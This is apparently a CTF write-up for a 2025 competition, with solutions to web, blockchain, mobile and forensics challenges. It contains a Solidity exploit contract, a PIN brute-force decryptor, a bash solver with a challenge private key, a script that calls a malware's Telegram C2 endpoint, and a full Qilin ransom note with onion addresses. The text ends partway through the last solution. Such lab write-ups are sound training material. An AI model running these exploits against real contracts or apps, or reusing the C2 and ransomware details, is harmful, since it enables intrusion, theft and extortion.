---
title: "BADGE TO BREACH: ICS CYBER SIEGE 2025"
date: 2025-06-28
categories: [CTF]
tags: [CTF]
image: https://www.notion.so/image/attachment%3A7f946b79-e0db-4d04-a82b-7180952936ee%3Aimage.png?table=block&id=22026e60-5e7e-80c4-a058-fef24cea8026&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)
---

Date: 5-27-2025 (9PM) - 6-28-2025 (9PM)

Venue: Online

# Web

## **Baby Web**

From the source code, you can see that there's a filter on the word **"String"**, which makes it difficult to submit the key `randomBytes(16).toString('hex')`. It checks for the presence of **"String"** in the key.

```
app.post('/search', (req, res) => {
  const query = req.body.query;

  if (query.includes("String")) {
    return res.send(htmlPage("❌ Access Denied: Suspicious pattern detected."));
  }

  if (query.includes(key)) {
    return res.send(htmlPage("✅ Key matched: " + query + "\n🎉 Here is your flag: fakeflag{not the flag, and i love teh ais :D}"));
  } else {
    return res.send(htmlPage("❌ Key did not match."));
  }
});
```

So, to solve it need to pass the `query` parameter as an array instead of literal string which result it output flag.

![](https://www.notion.so/image/attachment%3A803d68dd-bab9-4a9c-9df9-4abbfd407740%3Aimage.png?table=block&id=22026e60-5e7e-80d2-bad5-fd861f3575bc&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3A273ec549-0240-41d1-bfbc-e7e0d6c094ce%3Aimage.png?table=block&id=22026e60-5e7e-8068-ba32-e146c8b627c3&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1090&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{i_was_confused_ab_what_to_make--so_i_made_a_js_type_confusion_baby_challenge_ehhe}`

---

# **Blockchain**

## **Bank**

given:

```
RPC_URL:
http://152.42.220.146:30001/9cc611eb-979f-4eb4-a829-171fa2cc8156

private key:
e82e47b9a024cbac853202fb3a507a87d558e000f9fe054331423d8161a7e9f6

SETUP_CONTRACT_ADDR:
0xD7c529c57a506Cb270eD8b9D92d24097AF6f4CF5

wallet_addr:
0x308300543D893556644f3278de1E6eeD9932581F
```

bash script to solve:

```
#!/bin/bash

export ETH_RPC_URL="http://152.42.220.146:30001/9cc611eb-979f-4eb4-a829-171fa2cc8156"
export PRIVATE_KEY="e82e47b9a024cbac853202fb3a507a87d558e000f9fe054331423d8161a7e9f6"
export SETUP="0xD7c529c57a506Cb270eD8b9D92d24097AF6f4CF5"

echo "[*] Fetching Bank & NFT addresses..."
RAW_BANK=$(cast call $SETUP "bank()")
RAW_NFT=$(cast call $SETUP "nft()")

BANK="0x${RAW_BANK:26}"
NFT="0x${RAW_NFT:26}"

echo "[*] BANK address: $BANK"
echo "[*] NFT address:  $NFT"

echo "[*] Calling sedekah() to mint tokenId 1..."
cast send $SETUP "sedekah()" --private-key $PRIVATE_KEY

echo "[*] Approving BANK to take tokenId 1..."
cast send $NFT "approve(address,uint256)" $BANK 1 --private-key $PRIVATE_KEY

echo "[*] Donating tokenId 1 to BANK..."
cast send $BANK "donate(uint256[])" "[1]" --private-key $PRIVATE_KEY

echo "[*] Withdrawing tokenId 0 and 1 from BANK..."
cast send $BANK "withdraw(uint256[])" "[0,1]" --private-key $PRIVATE_KEY

echo "[*] Checking if challenge is solved..."
cast call $SETUP "isSolved()"
```

Output:

![](https://www.notion.so/image/attachment%3A49f8ae8f-ac21-48a0-959d-d6287da0226e%3Aimage.png?table=block&id=22026e60-5e7e-80f2-a9ac-c19a7baf76d7&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3Ae88bf307-56a1-40ac-ba27-511d223257bb%3Aimage.png?table=block&id=22026e60-5e7e-80e6-8eaf-e262ffc1cf9c&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{pretty_simple_for_a_start}`

## **Oasis**

Find the Oasis testnet [explorer.oasis.io](http://explorer.oasis.io/)

Then, insert the address given to get the contract

Look for the successful transaction since the source code said that only owner can execute it

Find the raw data

![](https://www.notion.so/image/attachment%3A6a4ea3eb-0386-4994-a5d6-5e12de2b50d7%3Aimage.png?table=block&id=22026e60-5e7e-8098-998b-f86d04a990e3&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{0xFc044F87f2D158253348fF0fd3670f341bA29c5E}`

## **Size Does Not Matter**

The exploit involves deploying a contract (`Exploit.sol`) that, during its own constructor, sequentially calls all four required functions on the `Box` contract. At the time these calls are made, `extcodesize(address(this)) == 0`, so all size checks pass even though the deployed contract will eventually have code.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IBox {
    function aquastage1(address) external;
    function aquastage2(address) external;
    function aquastage3(address) external;
    function solve(address) external;
}

contract Exploit {
    constructor(address box) {
        IBox(box).aquastage1(address(this));
        IBox(box).aquastage2(address(this));
        IBox(box).aquastage3(address(this));
        IBox(box).solve(address(this));
    }
}
```

Steps using Remix:

After compile `Exploit.sol` , `Box.sol` , `Setup.sol` and setting up the wallet, first need to deploy the contract at the given setup contract address.

![](https://www.notion.so/image/attachment%3A5cc0b19d-446b-4e07-b2f6-d8aae3e25315%3Aimage.png?table=block&id=22026e60-5e7e-80e6-846a-c40852bfe3d4&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

The deployed contract showed below will be our starting point to get the `Box.sol` address which then will be our address to deploy on `Exploit.sol`.

![](https://www.notion.so/image/attachment%3A06a7d2f2-cb32-4041-9c0b-b7e102b07cfd%3Aimage.png?table=block&id=22026e60-5e7e-80d3-9d87-d94a8e9a83bf&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3Ace777a32-83bf-4e50-96bf-4cbe64709a42%3Aimage.png?table=block&id=22026e60-5e7e-80e9-92d9-dee40a944431&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

After done deploying, checking `isSolved` will eventually return `true` to satisfy the contract and get the flag.

![](https://www.notion.so/image/attachment%3A5c458157-a9ee-4e7c-aa37-8393cb352332%3Aimage.png?table=block&id=22026e60-5e7e-809c-a9e6-f54f6274c098&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3Ac2ecf722-c755-451d-bb67-aaaa34e32d9f%3AWhatsApp_Image_2025-06-28_at_19.03.20_d19b4d19.jpg?table=block&id=22026e60-5e7e-806a-9b2b-f4d3e712e350&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{small_and_big_schrodingerbox}`

---

# **Mobile**

## **Simple Guess**

On `string.xml` few string was found

```
<string name="ecp">M4EKATajtPe4ry4Vs3W0SQNNoIdSZnDdtdAArgeVZRX1WVod+/IOHiQ8uz3XeAJW</string>
<string name="iv">KF/M4Oz7SyDQOY5PWF76yw==</string>
<string name="salt">S7n8CyjFt28W6JOssy1OPg==</string>
```

Checking on `MainActivity` The program uses **aes** to decode but instead of key, it uses it as a salt of the key. the key was intended to be brute force.

```
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
from Crypto.Hash import SHA256  

# Constants from strings.xml
salt_b64 = "S7n8CyjFt28W6JOssy1OPg=="
iv_b64 = "KF/M4Oz7SyDQOY5PWF76yw=="
enc_b64 = "M4EKATajtPe4ry4Vs3W0SQNNoIdSZnDdtdAArgeVZRX1WVod+/IOHiQ8uz3XeAJW"

salt = base64.b64decode(salt_b64)
iv = base64.b64decode(iv_b64)
ciphertext = base64.b64decode(enc_b64)

print("[*] Starting brute-force from 0000 to 9999...")

for pin in range(10000):
    password = str(pin).zfill(4)
    try:
        key = PBKDF2(password, salt, dkLen=32, count=65536, hmac_hash_module=SHA256)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        plaintext = unpad(decrypted, AES.block_size)

        print(f"[?] Trying PIN: {password} => {plaintext}")

        if b"{" in plaintext or b"flag" in plaintext.lower():
            print(f"\n[+] PIN Found: {password}")
            print(f"[+] Decrypted: {plaintext.decode('utf-8')}")
            break

    except Exception:
        continue

print("[*] Done.")
```

Output:

```
└─$ python sol.py
[*] Starting brute-force from 0000 to 9999...
[?] Trying PIN: 0446 => b'\xe7J\xf6L\x05\xc3\xdb\x90\xaf\xefC63\xccg\xac\x05\x01zN\xf6\xd3I\xe6\x0ci\x8c\xc0\x1ed>\x89\xde\x12\\\xa0\xe4\xfe\x83\xbfQl\x9a\x97\x18\x9c\xc4'
[?] Trying PIN: 0467 => b'Q\xabsM3\x0bh\x03Y\xb6\xac\xb4\x1e\xcb\x871\xe5fop\x15\xa3\xd8\xd6E\xee\xc5\xad\x89N\xb1\x7f\x85+`\x93sJh\xda\x91 \xdf\xb3"\xea\xce'
[?] Trying PIN: 1429 => b'\xec\xce\xe9\xf4\x8f\xc2\xcb\xb2y\x0f(<\x8c\x1aC\x1c!W\xd8^\x81u\x11\xbfZ0\xf9\xee\xaa\x1c\xe1\xc0$C\xbfu\x8cs\xcd\x1c\xaa2pr\xc5\xb1\xf6'
[?] Trying PIN: 1435 => b'prelim{All_Y0u_N33d_1s_F0ur_D1g1tS}'

[+] PIN Found: 1435
[+] Decrypted: prelim{All_Y0u_N33d_1s_F0ur_D1g1tS}
[*] Done.
```

Flag: `prelim{All_Y0u_N33d_1s_F0ur_D1g1tS}`

## **Baby Gacha**

Intercept the traffic show that after clicking the `online shop` will do `POST` request to the `/get_shop` endpoint.

![](https://www.notion.so/image/attachment%3A1b6da867-6507-4860-b99d-580a4eb4ab4d%3Aimage.png?table=block&id=22026e60-5e7e-8052-bfe0-e6e2168a2537&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=850&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Tempered with the request to the highest currency value and the response with flag price lowest as possible which result in the output of the flag.

![](https://www.notion.so/image/attachment%3A4c5576ba-4c42-4f51-8f5d-20f26c2e775f%3Aimage.png?table=block&id=22026e60-5e7e-8058-b19a-eb492ad8d912&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{m4yB3_i_sh0Uldv3_u5eD_a_b3T7e12_w4Y_of_5eRv3r_s1de_4pP_1n7e6R1ty_v4lIDat10n}`

---

# **Forensics**

## \[0\] - Forensic Sanity Check

Read the instructions, get the flag from flag.txt

Flag: `prelim{warming_up_your_forensics_skills_for_real}`

## \[1\] - Initial Vector

Looking at the disk image given, an outdated wordpress plugin installed. The plugin has a file upload vulnerability. In access.log, some fishy file upload activity can be seen. One of the file being uploaded was a php file that contains a reverse shell.

CVE: [https://patchstack.com/database/wordpress/plugin/forminator/vulnerability/wordpress-forminator-plugin-1-24-6-unauthenticated-arbitrary-file-upload-vulnerability](https://patchstack.com/database/wordpress/plugin/forminator/vulnerability/wordpress-forminator-plugin-1-24-6-unauthenticated-arbitrary-file-upload-vulnerability)

MD5 Hash: 6abb43dc87e07140ba94beafda03baad

![](https://www.notion.so/image/attachment%3A2cb8b152-cf12-4749-b299-d77772084b12%3Aimage.png?table=block&id=22026e60-5e7e-8087-aa44-d2ab0d264004&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{CVE-2023-4596_6abb43dc87e07140ba94beafda03baad}`

## \[2\] - Priv Esc

Scanning the machine using Linpeas, we found that the machine is vulnerable to Dirty Pipe

![](https://www.notion.so/image/attachment%3A52de9bad-75ac-4d9f-bb2d-a45ce423e4f3%3Aimage.png?table=block&id=22026e60-5e7e-80ab-89d2-d9887ee86fb0&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Upon analysing authlog, a command ran inside the folder /tmp/CVE-2022-0847-DirtyPipe-Exploits

![](https://www.notion.so/image/attachment%3A7833db2e-4e40-47f7-b47e-1f3d3336d3b5%3Aimage.png?table=block&id=22026e60-5e7e-8090-8084-e131b4096fd8&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

It seems like a small hint at this point because the folder actually didn’t exist anymore. Upon reading about the cve dirtypipe, we can confirm that the attacker use this exploit.

1. The exploit can be done in Linux version 5.8 or newer.

![](https://www.notion.so/image/attachment%3A96bfe1d1-557e-465b-8868-016bc3802409%3Aimage.png?table=block&id=22026e60-5e7e-80be-86d4-c1099f207506&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

And this exact linux version is not patched.

![](https://www.notion.so/image/attachment%3Abbe539af-8671-4989-8a76-aa61d9b0c4c8%3Aimage.png?table=block&id=22026e60-5e7e-8028-b990-d7c0675da6fa&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

2. There are many POC that uses C lang to exploit. Since the webserver had already installed gcc, we assume that the compiled binary are in /usr/bin folder. And the folder before in /tmp was used for development stuff.

So, the binary we found is this which do the exploit.

![](https://www.notion.so/image/attachment%3A4ecf0cbc-e178-4e31-89dd-c4dd382fa51b%3Aimage.png?table=block&id=22026e60-5e7e-80c0-b7fb-ed7823f57f55&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Strings to get the flag.

![](https://www.notion.so/image/attachment%3A0ba0d0c1-349b-481b-b92a-71e90d0d9176%3Aimage.png?table=block&id=22026e60-5e7e-80c3-b42f-ccc98bf22b17&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `prelim{n4sty_l1nux_8ug_f0r_pr1v_3sc}`

## \[3\] **- C2**

In the same folder, we found a suspicious binary named telexfil, which created around the same time as dpipe binary

![](https://www.notion.so/image/attachment%3A2981ba0a-2c59-4cc7-8cfb-87396990bf7f%3Aimage.png?table=block&id=22026e60-5e7e-8074-9dc9-f4d7bdc94c04&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Because of the name, we know that the C2 must be Telegram.

Decompile the binary and build the url to get the flag.

```
botToken="8115121963:AAFDmYfQILi5vqHXojaXoezynLjo_Kqn4sQ"

fromChatId="7093036821"
toChatId="7093036821"

# forward messages on range
messageIds=($(seq 443 446))

for messageId in "${messageIds[@]}"; do
    body=$(jq -n \
        --arg message_id "$messageId" \
        --arg from_chat_id "$fromChatId" \
        --arg chat_id "$toChatId" \
        '{
            message_id: ($message_id | tonumber),
            disable_notification: false,
            from_chat_id: ($from_chat_id | tonumber),
            chat_id: ($chat_id | tonumber)
        }')

    curl -s -X POST "https://api.telegram.org/bot$botToken/forwardMessage" \
        -H "Content-Type: application/json" \
        -d "$body"
done
```

Output:

```
└─$ bash boom.sh | jq
{
  "ok": true,
  "result": {
    "message_id": 4506,
    "from": {
      "id": 8115121963,
      "is_bot": true,
      "first_name": "dump_my1",
      "username": "dump_my1_bot"
    },
    "chat": {
      "id": 7093036821,
      "first_name": "Steve",
      "type": "private"
    },
    "date": 1751118845,
    "forward_origin": {
      "type": "user",
      "sender_user": {
        "id": 8115121963,
        "is_bot": true,
        "first_name": "dump_my1",
        "username": "dump_my1_bot"
      },
      "date": 1749811616
    },
    "forward_from": {
      "id": 8115121963,
      "is_bot": true,
      "first_name": "dump_my1",
      "username": "dump_my1_bot"
    },
    "forward_date": 1749811616,
    "text": "prelim{y0u_f0und_th3_c2_h3ck_y3ah}"
  }
}
```

Flag: `prelim{y0o_f0und_th3_c2_h3ck_y3ah}`

## \[4\] -  **Ransomewhere**

multiple uploaded file on `uploads/2025/03/` using powershell, all tools indicate escalation tools that didnt use while analysis. But one of it is a weird looking file with the name `kill-it`.

![](https://www.notion.so/image/attachment%3A2e33286c-10ce-4976-a213-0e262a5a6efb%3Aimage.png?table=block&id=22026e60-5e7e-8033-bcb3-de842e7b1637&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Extraction the hash file of `kill-it` on `k.zip`

![](https://www.notion.so/image/attachment%3Ade2a446d-bb9b-44e2-8cc9-0ba590d31fa2%3Aimage.png?table=block&id=22026e60-5e7e-8051-b60b-f2221cf4d480&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

It detect as qilin ransomware

![](https://www.notion.so/image/attachment%3A29e4146e-e639-45da-a29c-de55c3573187%3Aimage.png?table=block&id=22026e60-5e7e-80cd-b987-f97c6b195463&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

while running the program, it ask for the password:

```
PS C:\Users\os1ris\Desktop\kiil > .\kill-it.exe
[12:03:20|+0.00002520] <ThreadId(1)>: [FATAL] provide password with `--password` before start!
FLARE-VM 06/28/2025 05:03:20

PS C:\Users\os1ris\Desktop\kiil > .\kill-it.exe --password 1234
[12:03:27|+0.00002510] <ThreadId(1)>: [INFO] Checking password validity
[12:03:27|+0.00082180] <ThreadId(1)>: [FATAL] Password is not correct!
```

---

### Info

| **Field** | **Value** |
| --- | --- |
| File name | kill-it |
| Size | 5,254,656 (5.01 MiB) |
| Operating system | Windows (95) |
| Architecture | I386 |
| Mode | 32-bit |
| Type | Console |
| Endianness | Little Endian (LE) |
| Hash (SHA256) | bc34150b34413dbfe4e6332d4c2657af74e8a167c14e9c9d2fc787632759101f |

---

### Initial View

Execution:

```
PS C:\Users\os1ris\Desktop\ransomwhere > .\kill-it.exe
[10:59:36|+0.00002680] <ThreadId(1)>: [FATAL] provide password with `--password` before start!
FLARE-VM 06/30/2025 03:59:36

PS C:\Users\os1ris\Desktop\ransomwhere > .\kill-it.exe --password 1234
[10:59:44|+0.00002530] <ThreadId(1)>: [INFO] Checking password validity
[10:59:44|+0.00162210] <ThreadId(1)>: [FATAL] Password is not correct!
FLARE-VM 06/30/2025 03:59:44
```

Multiple API was imported in this program.

![](https://www.notion.so/image/attachment%3A2bebecc7-ec28-4195-a0a6-09a688ea6a27%3Aimage.png?table=block&id=22226e60-5e7e-8037-82f6-e896d919af5d&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

### Static Analysis

start function:

Set environment, load value of size and sleep time finally it will call a stub on `sub_4028B0`

![](https://www.notion.so/image/attachment%3A93c3a80d-b330-4f1f-9026-72f762f2a637%3Aimage.png?table=block&id=22226e60-5e7e-80db-a31e-f6cd8908faf9&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

sub\_4028B0:

Offset of Main was detected in this function call used as a **label or identifier. Assuming** for logging, debugging, or internal naming in a structure such as thread

![](https://www.notion.so/image/attachment%3Acdcd353b-3b6b-4b51-b380-ceb6b1daf210%3Aimage.png?table=block&id=22226e60-5e7e-8056-8687-e33a0cde4198&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

two compare jump which indicates fatal error runtime and another one it to prepares and runs shellcode or thread, sets up handlers, and under conditional to triggers Rust error/report logging.

![](https://www.notion.so/image/attachment%3Ae66bc14b-b2fd-43d9-8564-fda1067da948%3Aimage.png?table=block&id=22226e60-5e7e-8081-812e-dab2ede55010&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

sub\_401880:  
this function parses the string command line `GetCommandLineW`)and initializes variables it is to prepare extract arguments

![](https://www.notion.so/image/attachment%3Adc0e3ca1-c4d4-4cc6-9e5b-2cfcf8f86771%3Aimage.png?table=block&id=22226e60-5e7e-805a-bce6-c04aedf1700f&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

process a filename or buffer using `sub_403860` to manipulates or transforms its contents via `sub_443F40`, then conditionally frees it using `HeapFree` if needed

![](https://www.notion.so/image/attachment%3Ad1756d17-9550-4e3b-b5eb-8f8c3d363ccd%3Aimage.png?table=block&id=22226e60-5e7e-800c-90ae-e5a62d7d53c7&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

sub\_443F40:

Where the function try to call the memory and detect if the memory can be load or not:

![](https://www.notion.so/image/attachment%3A629aa8be-d53c-46de-ab21-37225e1afa8e%3Aimage.png?table=block&id=22226e60-5e7e-8095-91eb-eae19b2f1972&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

sub\_442F30:

5 function call was call on this function that will be break down into table

![](https://www.notion.so/image/attachment%3A316f8e97-958d-4ba0-bbc3-5081d9a107da%3Aimage.png?table=block&id=22226e60-5e7e-805a-8eab-fa9c6058d313&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Handler Functions:

| Subroutine | API Called | Purpose |
| --- | --- | --- |
| `sub_442A30` | `FreeLibrary` | Unload a previously loaded DLL |
| `sub_442A50` | `GetProcAddress` | Resolve function address |
| `sub_442A70` | `LoadLibraryA` | Load a DLL into memory |
| `sub_442A00` | `VirtualFree` | Free allocated memory |
| `sub_4429D0` | `VirtualAlloc` | Allocate memory for payload |

Sets up a custom loader that dynamically loads DLLs, resolves function addresses, allocates memory for payload, and handles cleanup.

sub\_4429D0

![](https://www.notion.so/image/attachment%3A3fd39bcf-dd08-4572-95fd-3a0e9e37bbea%3Aimage.png?table=block&id=22226e60-5e7e-80f2-afb7-d6b8f138623a&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

VirtualAlloc is often used by malware to allocate memory as part of process injection. It goal to extract it should be because it holds the final decrypted payload in memory, unlike setup functions. Malware commonly uses it to execute code directly in memory and avoid detection by writing to disk. So its not as simple as string the file to get the memory string word.

### Dynamic Analysis

[Video](https://www.youtube.com/embed/IvXGnMmqIXE?rel=0)

start the program using x32dbg. Press `Ctrl+G` Search for `VirtualAlloc`

![](https://www.notion.so/image/attachment%3Ab2b5f2ee-9b66-4586-9da9-067fa9846bef%3Aimage.png?table=block&id=22126e60-5e7e-8028-8d7c-fca169705e9a&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Set breakpoint on the **VirtualAlloc** and `Run` until it stopped at the starting point of it.

![](https://www.notion.so/image/attachment%3Af8dcdce2-55b5-45d1-832d-577d0e3839b6%3Aimage.png?table=block&id=22126e60-5e7e-80cf-a7a4-d782b04aee11&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Notice the EAX was at `10000000`

![](https://www.notion.so/image/attachment%3A4bdca677-e86e-43e4-9504-e7ace852ccb0%3Aimage.png?table=block&id=22126e60-5e7e-805f-911e-c310a569b6d2&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Press `Ctrl+G` and check on the first try shown the memory was invalid, which **EAX** **wasn’t created yet**:

![](https://www.notion.so/image/attachment%3A2004cbbe-07f4-48ad-b588-918c2f076b06%3Aimage.png?table=block&id=22126e60-5e7e-80b6-a145-f2575e025139&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Continue until return or press `Ctrl+F9`

![](https://www.notion.so/image/attachment%3A8c7c60b7-d199-4119-91c9-aefd7f7d5ca0%3Aimage.png?table=block&id=22126e60-5e7e-80f8-a248-f41afc9ae242&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Set breakpoint here on ret(return) just incase (actually no need):

![](https://www.notion.so/image/attachment%3A5d18d666-3655-4e05-a63e-bed506a8c225%3Aimage.png?table=block&id=22126e60-5e7e-803b-bba1-ed356ff43808&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

`Run` again and it will get back to **VirtualAlloc**. After that go back to **EAX** address of `0x10000000`:

![](https://www.notion.so/image/attachment%3Aada842e3-453b-40e3-aa53-8ede318a5f0a%3Aimage.png?table=block&id=22126e60-5e7e-8054-8f0f-c6b97372a5ec&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

![](https://www.notion.so/image/attachment%3Aa6ed7909-e8bb-401c-a3f8-2c34ec47b83f%3Aimage.png?table=block&id=22126e60-5e7e-808b-b0cb-c14428e79fd8&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Then check the dump. it still zero

Proceed to `Run` on second times and `Ctrl+G` again:

![](https://www.notion.so/image/attachment%3Aada842e3-453b-40e3-aa53-8ede318a5f0a%3Aimage.png?table=block&id=22126e60-5e7e-8002-8e67-c18dcbce116b&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

on dump it will look something like this:

![](https://www.notion.so/image/attachment%3Ac47880fc-e200-46ab-8526-95f1b04de163%3Aimage.png?table=block&id=22126e60-5e7e-8040-8fd8-f3658637a6e8&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Right click and `Follow in Memory Map`

![](https://www.notion.so/image/attachment%3Ae8dd6e94-a1af-4ae1-9d09-d9e0ee37c9af%3Aimage.png?table=block&id=22126e60-5e7e-808b-a04c-e58e82190317&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=690&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

It will go to Memory Map of those file, Hit `Dump Memory to File` and save to local storage

> If the file is empty without string, repeat the process from `run` until `ret` and follow in memory map again

![](https://www.notion.so/image/attachment%3Aaf4f203b-e319-4c61-85ae-019dd232226c%3Aimage.png?table=block&id=22126e60-5e7e-800b-8abb-e90a139efccb&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

We can see the note of the ransom:

```
λ strings test.bin | grep "password"
 "note": "-- Qilin \r\r\n\r\r\nYour network/system was encrypted. \r\r\nEncrypted files have new extension. \r\r\n\r\r\n-- Compromising and sensitive data \r\r\n\r\r\nWe have downloaded compromising and sensitive data from your system/network.\r\r\nOur group cooperates with the mass media.\r\r\nIf you refuse to communicate with us and we do not come to an agreement, your data will be reviewed and published on our blog and on the media page (https://31.41.244.100)\r\r\n\r\r\nBlog links:\r\r\nhttp://kbsqoivihgdmwczmxkbovk7ss2dcynitwhhfu5yw725dboqo5kthfaad.onion\r\r\nhttp://ijzn3sicrcy7guixkzjkib4ukbiilwc3xhnmby4mcbccnsd7j2rekvqd.onion\r\r\n\r\r\nData includes: \r\r\n- Employees personal data, CVs, DL , SSN. \r\r\n- Complete network map including credentials for local and remote services. \r\r\n- Financial information including clients data, bills, budgets, annual reports, bank statements. \r\r\n- Complete datagrams/schemas/drawings for manufacturing in solidworks format \r\r\n- And more... \r\r\n\r\r\n-- Warning \r\r\n\r\r\n1) If you modify files - our decrypt software won't able to recover data \r\r\n2) If you use third party software - you can damage/modify files (see item 1) \r\r\n3) You need cipher key / our decrypt software to restore you files. \r\r\n4) The police or authorities will not be able to help you get the cipher key. We encourage you to consider your decisions. \r\r\n\r\r\n-- Recovery \r\r\n\r\r\n1) Download tor browser: https://www.torproject.org/download/ \r\r\n2) Go to domain \r\r\n3) Enter credentials\r\r\n\r\r\nPlease note that communication with us is only possible via the website in the Tor browser, which is specified in this note. \r\r\nAll other means of communication are not real and may be created by third parties, if such were not provided in this note or on the website specified in this note.\r\r\n-- Credentials \r\n\r\nExtension: 9ENeyQ1NS- \r\nDomain: zifh42ydlktd35ps7rrmfpacwxmywzjj6vuij64var6fvzl3hywwzkyd.onion \r\nlogin: Ul06AyV9oM6HJYvTyM0V9xVwwsRvqYUg \r\npassword:",
 "password_hash": "181a53ef753248973beaa07cdbdb2ddc2ea39623625ed598959efc5dea8c57ed"
password_hash
---STRIP---
```

Now string and grep the `password_hash`

```
λ strings test.bin | grep "password_hash"
